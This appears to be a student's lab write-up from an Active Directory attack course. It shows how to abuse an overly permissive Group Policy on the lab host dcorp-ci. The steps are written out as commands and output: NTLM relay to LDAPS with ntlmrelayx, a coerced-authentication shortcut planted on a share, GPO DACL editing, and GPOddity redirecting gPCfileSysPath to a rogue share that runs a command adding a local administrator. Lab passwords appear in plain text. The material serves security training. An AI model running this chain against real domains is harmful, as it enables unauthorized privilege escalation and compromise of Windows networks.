---
icon: vial
---

# 6 - Learning Object 6️

## Tasks



1 - Abuse an overly permissive Group Policy to get admin access on dcorp-ci.

Flag 9 \[Student VM] - Name of the Group Policy attribute that is modified 🚩



## Solutions

### 1 - Abuse an overly permissive Group Policy to get admin access on dcorp-ci.

Start InviShell and PowerView

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Powerview.ps1
```

and check info regarding GPO for DCORP-CI

```powershell
Get-DomainGPO -ComputerIdentity DCORP-CI
```

```powershell
Exception calling "FindAll" with "0" argument(s): "There is no such object on the server.
"

flags                    : 0
displayname              : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 12/24/2024 7:09:01 AM
versionnumber            : 3
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged               : 296496
dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 12/18/2024 7:31:22 AM
showinadvancedviewonly   : True
usncreated               : 293100
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

It appartains to DevOps Policy, we can confirm it using `Get-DomainGPO -Identity 'DevOps Policy'` command.

Now, we need to run ntlmrelayx (regarding impacket tool) on windows machine (using **wsl.exe**), to relay the LDAP service on the DC: `sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server`

{% hint style="info" %}
wsl psw is: WSLToTh3Rescue!
{% endhint %}

* I obtain DC's IP pinging it `ping DOLLARCORP.MONEYCORP.LOCAL` -> 172.16.2.1

```bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.67 --http-port '80,8080' -i --no-smb-server
```

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Now we need to establish the authentication on student machine, go there and create a Shortcut that connects to the ntlmrelayx listener:

* Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location -> Next and Save it as _studentx.lnk_

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.67' -UseDefaultCredentials"
```

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

Copy the studentx.lnk script to \\\dcorp-ci\AI\


```powershell
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```

Run it with double click and we establish the connection:

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Now, we need to connect to this Ldap shell using `nc 127.0.0.1 11000` and assign it permissions regarding DevOps GPO: `{0BF8D01C-1F62-4BDC-958C-57140B67D147}`, do it using a new wsl shell:

```powershell
write_gpo_dacl student867 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

Stop the ldap shell and ntlmrelayx using Ctrl + C.

Now, we need to run the GPOddity command to create the new template:

<pre class="language-bash"><code class="lang-bash"><strong>cd /mnt/c/AD/Tools/GPOddity
</strong><strong>sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student867' --password 'Ld7bTFyEd7Gc7UWn' --command 'net localgroup administrators student867 /add' --rogue-smbserver-ip '172.16.100.67' --rogue-smbserver-share 'std687-gp' --dc-ip '172.16.2.1' --smb-mode none
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Keep it running, meanwhile open another wsl shell and create and share the std687-gp directory:

```bash
mkdir /mnt/c/AD/Tools/std687-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std687-gp
```

Great, now open a new windows shell as administrator to create a share (std687-gp) ad assign privileges for everyone:&#x20;

```powershell
net share std687-gp=C:\AD\Tools\std687-gp /grant:Everyone,Full
icacls "C:\AD\Tools\std867-gp" /grant Everyone:F /T
```

<div align="left"><figure><img src="../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure></div>

Now, we can verify if the gPCfileSysPath has been modified for the DevOps Policy running this command:

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

The update for this policy is configured to be every 2 minutes in the lab and after waiting for 2 minutes, student867 should be added to the local administrators group on dcorp-ci:

```powershell
winrs -r:dcorp-ci cmd /c "set computername && set username"
```

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

### Flag 9 \[Student VM] - Name of the Group Policy attribute that is modified 🚩

The GPO attributed modified on DevOps Policy is: gPCfileSysPath

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
